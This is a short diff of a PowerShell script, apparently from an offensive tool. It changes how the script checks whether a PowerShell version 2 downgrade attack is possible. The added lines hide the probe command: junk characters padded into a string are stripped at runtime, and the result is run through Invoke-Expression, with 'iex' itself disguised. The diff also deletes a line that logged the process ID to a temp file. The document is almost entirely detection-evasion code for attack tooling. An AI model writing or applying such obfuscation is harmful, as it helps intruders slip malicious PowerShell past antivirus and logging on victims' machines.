@@ -6,7 +6,7 @@
 
 #Global variable declarations
 $ErrorActionPreference = "SilentlyContinue"
-echo "$PID" > "$Env:TMP\kkk.log"
+
 
 IF($Action -ieq "start")
 {
@@ -19,8 +19,8 @@ IF($Action -ieq "start")
 
    If($UsePS2 -ieq "true")
    {
-
-      powershell -version 2 -C echo ps2versionfound|Out-File "$Env:TMP\downgradeatt.log" -Force
+      $TryThisInsted = "#pow#e@rsh#e@ll -@ve#r@sio@n @2# -@C# ech@o ps2v@er#si@onfo@un#d|O@ut-@File# $Env:TMP\downgradeatt.log -Fo@rc@e" -replace '(@|#)',''
+      "$TryThisInsted"|&('SEX' -replace 'S','i')
       $TestDowngradeAtt = Get-Content -Path "$Env:TMP\downgradeatt.log"|Select-String "ps2versionfound"
       Remove-Item -Path "$Env:TMP\downgradeatt.log" -Force
       If($TestDowngradeAtt -iMatch '^(ps2versionfound)$')
